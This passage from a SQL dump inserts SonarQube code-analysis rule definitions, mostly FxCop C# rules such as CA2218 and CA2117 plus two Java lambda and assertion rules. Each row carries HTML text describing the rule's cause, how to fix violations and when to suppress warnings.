<p><a href="http://msdn.microsoft.com/en-us/library/ms182341.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182341.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812416, 1510817812417, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (513, 'CA2243: Attribute string literals should parse correctly', 'AttributeStringLiteralsShouldParseCorrectly', 'CA2243', 'fxcop', '<h2>Cause</h2>
<p>
            An attribute''s string literal parameter does not parse correctly for a URL, GUID, or Version.
</p>
<h2>Rule Description</h2>
<p>
            Since attributes are derived from <code>System.Attribute</code>, and attributes are used at compile time, only constant values can be passed to their constructors. Attribute parameters that must represent URLs, GUIDs and Versions cannot be typed as <code>System.Uri</code>, <code>System.Guid</code>, and <code>System.Version</code>, because these types cannot be represented as constants. Instead, they must be represented by strings.
            Because the parameter is typed as a string, it is possible that an incorrectly formatted parameter could be passed at compile time.
            This rule uses a naming heuristic to find parameters that represent a uniform resource identifier (URI), a Globally Unique Identifier (GUID) or a Version and verifies that the passed value is correct.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change the parameter string to a correctly formed URL, GUID, or Version.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the parameter does not represent a URL, GUID, or Version.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264490.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264490.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812418, 1510817812419, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (514, 'CA1026: Default parameters should not be used', 'DefaultParametersShouldNotBeUsed', 'CA1026', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type contains an externally visible method that uses a default parameter.
</p>
<h2>Rule Description</h2>
<p>
            Methods that use default parameters are allowed under the Common Language Specification (CLS); however, the CLS allows compilers to ignore the values that are assigned to these parameters. Code that is written for compilers that ignore default parameter values must explicitly provide arguments for each default parameter. To maintain the behavior that you want across programming languages, methods that use default parameters should be replaced with method overloads that provide the default parameters.
            The compiler ignores the values of default parameters for Managed Extension for C++ when it accesses managed code. The Visual Basic compiler supports methods that have default parameters that use the <code>Optional (Visual Basic)</code> keyword.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the method that uses default parameters with method overloads that supply the default parameters.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ReplaceRepetitiveArgumentsWithParamsArray}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182135.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182135.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812420, 1510817812420, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (526, 'CA1506: Avoid excessive class coupling', 'AvoidExcessiveClassCoupling', 'CA1506', 'fxcop', '<h2>Cause</h2>
<p>
            A type or method is coupled with many other types.
</p>
<h2>Rule Description</h2>
<p>
            This rule measures class coupling by counting the number of unique type references that a type or method contains.
            Types and methods that have a high degree of class coupling can be difficult to maintain. It is a good practice to have types and methods that exhibit low coupling and high cohesion.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix this violation, try to redesign the type or method to reduce the number of types to which it is coupled.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Exclude this warning when the type or method is still considered maintainable despite its large number of dependencies on other types.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb397994.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb397994.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812443, 1510817812443, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (515, 'CA2117: APTCA types should only extend APTCA base types', 'AptcaTypesShouldOnlyExtendAptcaBaseTypes', 'CA2117', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type in an assembly with the <code>System.Security.AllowPartiallyTrustedCallersAttribute</code> attribute inherits from a type declared in an assembly that does not have the attribute.
</p>
<h2>Rule Description</h2>
<p>
            By default, public or protected types in assemblies with strong names are implicitly protected by an Inheritance Demands for full trust. Strong-named assemblies marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute do not have this protection. The attribute disables the inheritance demand. This makes exposed types declared in the assembly inheritable by types that do not have full trust.
            When the APTCA attribute is present on a fully trusted assembly, and a type in the assembly inherits from a type that does not allow partially trusted callers, a security exploit is possible. If two types T1 and T2 meet the following conditions, malicious callers can use the type T1 to bypass the implicit full trust inheritance demand that protects T2:
            <ul>
              <li>

                  T1 is a public type declared in a fully trusted assembly that has the APTCA attribute.
              </li>
              <li>

                  T1 inherits from a type T2 outside its assembly.
              </li>
              <li>

                  T2''s assembly does not have the APTCA attribute and, therefore, should not be inheritable by types in partially trusted assemblies.
              </li>
            </ul>
            A partially trusted type X can inherit from T1, which gives it access to inherited members declared in T2. Because T2 does not have the APTCA attribute, its immediate derived type (T1) must satisfy an inheritance demand for full trust; T1 has full trust and therefore satisfies this check. The security risk is because X does not participate in satisfying the inheritance demand that protects T2 from untrusted subclassing. For this reason, types with the APTCA attribute must not extend types that do not have the attribute.
            Another security issue, and perhaps a more common one, is that the derived type (T1) can, through programmer error, expose protected members from the type that requires full trust (T2). When this occurs, untrusted callers gain access to information that should be available only to fully trusted types.
</p>
<h2>How to Fix Violations</h2>
<p>
            If the type reported by the violation is in an assembly that does not require the APTCA attribute, remove it.
            If the APTCA attribute is required, add an inheritance demand for full trust to the type. This protects against inheritance by untrusted types.
            It is possible to fix a violation by adding the APTCA attribute to the assemblies of the base types reported by the violation. Do not do this without first conducting an intensive security review of all code in the assemblies and all code that depends on the assemblies.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            To safely suppress a warning from this rule, you must ensure that protected members exposed by your type do not directly or indirectly allow untrusted callers to access sensitive information, operations, or resources that can be used in a destructive manner.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AptcaMethodsShouldOnlyCallAptcaMethods}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182298.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182298.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812421, 1510817812422, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (516, 'CA2218: Override GetHashCode on overriding Equals', 'OverrideGetHashCodeOnOverridingEquals', 'CA2218', 'fxcop', '<h2>Cause</h2>
<p>
            A public type overrides <code>Object.Equals</code> but does not override <code>Object.GetHashCode</code>.
</p>
<h2>Rule Description</h2>
<p>


                <code>GetHashCode</code>
               returns a value, based on the current instance, that is suited for hashing algorithms and data structures such as a hash table. Two objects that are the same type and are equal must return the same hash code to ensure that instances of the following types work correctly:
            <ul>
              <li>

                  <code>HashTable</code>

              </li>
              <li>


                    <code>System.Collections.SortedList</code>


              </li>
              <li>

                  Dictionary

              </li>
              <li>

                  SortDictionary

              </li>
              <li>

                  SortList

              </li>
              <li>

                  HybredDictionary

              </li>
              <li>


                    <code>System.Collections.Specialized.ListDictionary</code>


              </li>
              <li>


                    <code>System.Collections.Specialized.OrderedDictionary</code>


              </li>
              <li>
                Types that implement IEqualityComparer
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, provide an implementation of <code>GetHashCode</code>. For a pair of objects of the same type, you must ensure that the implementation returns the same value if your implementation of <code>Equals</code> returns <code>true</code> for the pair.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Class Example</h2>

<h3>Description</h3>
<p>
                The following example shows a class (reference type) that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    // Violates this rule     
    public class Point
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override bool Equals(object obj)
        {
            if (obj == null)
                return false;

            if (GetType() != obj.GetType())
                return false;

            Point point = (Point)obj;

            if (_X != point.X)
                return false;

            return _Y == point.Y;
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                The following example fixes the violation by overriding GetHashCode.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public struct Point : IEquatable&lt;Point&gt;
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public override bool Equals(object obj)
        {
            if (!(obj is Point))
                return false;

            return Equals((Point)obj);
        }

        public bool Equals(Point other)
        {
            if (_X != other._X)
                return false;

            return _Y == other._Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            return point1.Equals(point2);
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !point1.Equals(point2);
        }
    }
}
</pre>





</p>
<h2>Structure Example</h2>

<h3>Description</h3>
<p>
                The following example shows a structure (value type) that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    // Violates this rule     
    public struct Point : IEquatable&lt;Point&gt;
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override bool Equals(object obj)
        {
            if (!(obj is Point))
                return false;

            return Equals((Point)obj);
        }

        public bool Equals(Point other)
        {
            if (_X != other._X)
                return false;

            return _Y == other._Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            return point1.Equals(point2);
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !point1.Equals(point2);
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                The following example fixes the violation by overriding GetHashCode.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public struct Point : IEquatable&lt;Point&gt;
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public override bool Equals(object obj)
        {
            if (!(obj is Point))
                return false;

            return Equals((Point)obj);
        }

        public bool Equals(Point other)
        {
            if (_X != other._X)
                return false;

            return _Y == other._Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            return point1.Equals(point2);
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !point1.Equals(point2);
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>




                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>




                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>




                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>




                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182358.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182358.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812423, 1510817812424, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (517, 'CA2149: Transparent methods must not call into native code', 'TransparentMethodsMustNotCallNativeCode', 'CA2149', 'fxcop', '<h2>Cause</h2>
<p>
            A method calls a native function through a method stub such as P/Invoke.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires on any transparent method which calls directly into native code, for example, through a P/Invoke. Violations of this rule lead to a <code>MethodAccessException</code> in the level 2 transparency model, and a full demand for <code>UnmanagedCode</code> in the level 1 transparency model.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the method that calls the native code with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ee155709.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ee155709.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812427, 1510817812427, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (518, 'CA1025: Replace repetitive arguments with params array', 'ReplaceRepetitiveArgumentsWithParamsArray', 'CA1025', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method in a public type has more than three parameters, and its last three parameters are the same type.
</p>
<h2>Rule Description</h2>
<p>
            Use a parameter array instead of repeated arguments when the exact number of arguments is unknown and the variable arguments are the same type, or can be passed as the same type. For example, the <code>WriteLine</code> method provides a general-purpose overload that uses a parameter array to accept any number of <code>Object</code> arguments.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the repeated arguments with a parameter array.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is always safe to suppress a warning from this rule; however, this design might cause usability issues.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182167.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182167.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812428, 1510817812429, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (519, 'CA1038: Enumerators should be strongly typed', 'EnumeratorsShouldBeStronglyTyped', 'CA1038', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type implements <code>System.Collections.IEnumerator</code> but does not provide a strongly typed version of the <code>IEnumerator.Current</code> property. Types that are derived from the following types are exempt from this rule:
            <ul>
              <li>


                    <code>System.Collections.CollectionBase</code>


              </li>
              <li>


                    <code>System.Collections.DictionaryBase</code>


              </li>
              <li>


                    <code>System.Collections.ReadOnlyCollectionBase</code>


              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            This rule requires <code>IEnumerator</code> implementations to also provide a strongly typed version of the <code>Current</code> property so that users are not required to cast the return value to the strong type when they use the functionality that is provided by the interface. This rule assumes that the type that implements <code>IEnumerator</code> contains a collection of instances of a type that is stronger than <code>Object</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement the interface property explicitly (declare it as IEnumerator.Current). Add a public strongly typed version of the property, declared as Current, and have it return a strongly typed object.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule when you implement an object-based enumerator for use with an object-based collection, such as a binary tree. Types that extend the new collection will define the strongly typed enumerator and expose the strongly typed property.
</p>
<h2>Example</h2>
<p>


                <code>CA1035: ICollection implementations have strongly typed members</code>




                {rule:fxcop:ListsAreStronglyTyped}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182148.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182148.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812429, 1510817812430, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (520, 'CA2143: Transparent methods should not use security demands', 'TransparentMethodsShouldNotDemand', 'CA2143', 'fxcop', '<h2>Cause</h2>
<p>
            A tranparent type or method is declaratively marked with a <code>System.Security.Permissions.SecurityAction</code><code>.Demand</code> demand or the method calls the <code>CodeAccessPermission.Demand</code> method.
</p>
<h2>Rule Description</h2>
<p>
            Security transparent code should not be responsible for verifying the security of an operation, and therefore should not demand permissions. Security transparent code should use full demands to make security decisions and safe-critical code should not rely on transparent code to have made the full demand. Any code that performs security checks, such as security demands, should be safe-critical instead.
</p>
<h2>How to Fix Violations</h2>
<p>
            In general, to fix a violation of this rule, mark the method with the <code>SecuritySafeCriticalAttribute</code> attribute. You can also remove the demand.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997566.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997566.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812431, 1510817812431, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (521, 'CA1041: Provide ObsoleteAttribute message', 'ProvideObsoleteAttributeMessage', 'CA1041', 'fxcop', '<h2>Cause</h2>
<p>
            A type or member is marked by using a <code>System.ObsoleteAttribute</code> attribute that does not have its <code>ObsoleteAttribute.Message</code> property specified.
</p>
<h2>Rule Description</h2>
<p>


                <code>ObsoleteAttribute</code>
               is used to mark deprecated library types and members. Library consumers should avoid the use of any type or member that is marked obsolete. This is because it might not be supported and will eventually be removed from later versions of the library. When a type or member marked by using <code>ObsoleteAttribute</code> is compiled, the <code>Message</code> property of the attribute is displayed. This gives the user information about the obsolete type or member. This information generally includes how long the obsolete type or member will be supported by the library designers and the preferred replacement to use.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add the message parameter to the <code>ObsoleteAttribute</code> constructor.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule because the <code>Message</code> property provides critical information about the obsolete type or member.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182166.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182166.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812432, 1510817812432, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (522, 'CA2105: Array fields should not be read only', 'ArrayFieldsShouldNotBeReadOnly', 'CA2105', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected field that holds an array is declared read-only.
</p>
<h2>Rule Description</h2>
<p>
            When you apply the <code>readonly</code> (<code>ReadOnly</code> in Visual Basic) modifier to a field that contains an array, the field cannot be changed to refer to a different array. However, the elements of the array that are stored in a read-only field can be changed. Code that makes decisions or performs operations that are based on the elements of a read-only array that can be publicly accessed might contain an exploitable security vulnerability.
            Note that having a public field also violates the design rule {rule:fxcop:DoNotDeclareVisibleInstanceFields}.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix the security vulnerability that is identified by this rule, do not rely on the contents of a read-only array that can be publicly accessed. It is strongly recommended that you use one of the following procedures:
            <ul>
              <li>
                Replace the array with a strongly typed collection that cannot be changed. For more information, see <code>System.Collections.ReadOnlyCollectionBase</code>.
              </li>
              <li>
                Replace the public field with a method that returns a clone of a private array. Because your code does not rely on the clone, there is no danger if the elements are modified.
              </li>
            </ul>
            If you chose the second approach, do not replace the field with a property; properties that return arrays adversely affect performance. For more information, see <code>CA1819: Properties should not return arrays</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Exclusion of a warning from this rule is strongly discouraged. Almost no scenarios occur where the contents of a read-only field are unimportant. If this is the case with your scenario, remove the <code>readonly</code> modifier instead of excluding the message.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182299.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182299.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812433, 1510817812434, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (523, 'CA1406: Avoid Int64 arguments for Visual Basic 6 clients', 'AvoidInt64ArgumentsForVB6Clients', 'CA1406', 'fxcop', '<h2>Cause</h2>
<p>
            A type that is specifically marked as visible to Component Object Model (COM) declares a member that takes a System.Int64 argument.
</p>
<h2>Rule Description</h2>
<p>
            Visual Basic 6 COM clients cannot access 64-bit integers.
            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated; the containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule for a parameter whose value can always be expressed as a 32-bit integral, change the parameter type to System.Int32. If the value of the parameter might be larger than can be expressed as a 32-bit integral, change the parameter type to <code>System.Decimal</code>. Note that both <code>System.Single</code> and <code>System.Double</code> lose precision at the upper ranges of the Int64 data type. If the member is not meant to be visible to COM, mark it with the <code>ComVisibleAttribute</code> set to <code>false</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if it is certain that Visual Basic 6 COM clients will not access the type.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}<br/>




                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>




                {rule:fxcop:MarkAssembliesWithComVisible}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182195.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182195.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812439, 1510817812439, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (799, 'Parentheses should be removed from a single lambda input parameter when its type is inferred', 'S1611', NULL, 'squid', '<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single
parameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
(x) -&gt; x * 2
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; x * 2
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'java8', false, 'HTML', 1510817812814, 1510817812815, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (800, 'Literal boolean values should not be used in assertions', 'S2701', NULL, 'squid', '<p>There''s no reason to use literal boolean values in assertions. Doing so is at best confusing for maintainers, and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Assert.assertTrue(true);  // Noncompliant
assertThat(true).isTrue(); // Noncompliant
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'junit,tests', false, 'HTML', 1510817812815, 1510817812816, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (524, 'CA2205: Use managed equivalents of Win32 API', 'UseManagedEquivalentsOfWin32Api', 'CA2205', 'fxcop', '<h2>Cause</h2>
<p>
            A platform invoke method is defined and a method with the equivalent functionality exists in the .NET Framework class library.
</p>
<h2>Rule Description</h2>
<p>
            A platform invoke method is used to call an unmanaged DLL function and is defined using the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute, or the <code>Declare</code> keyword in Visual Basic. An incorrectly defined platform invoke method can lead to runtime exceptions because of issues such as a misnamed function, faulty mapping of parameter and return value data types, and incorrect field specifications, such as the calling convention and character set. If available, it is generally simpler and less error prone to call the equivalent managed method than to define and call the unmanaged method directly. Calling a platform invoke method can also lead to additional security issues that need to be addressed.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the call to the unmanaged function with a call to its managed equivalent.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if the suggested replacement method does not provide the needed functionality.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallGetLastErrorImmediatelyAfterPInvoke}<br/>




                {rule:fxcop:MovePInvokesToNativeMethodsClass}<br/>




                {rule:fxcop:PInvokeEntryPointsShouldExist}<br/>




                {rule:fxcop:PInvokesShouldNotBeVisible}<br/>




                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}


</p><h2>MSDN Documentation</h2>
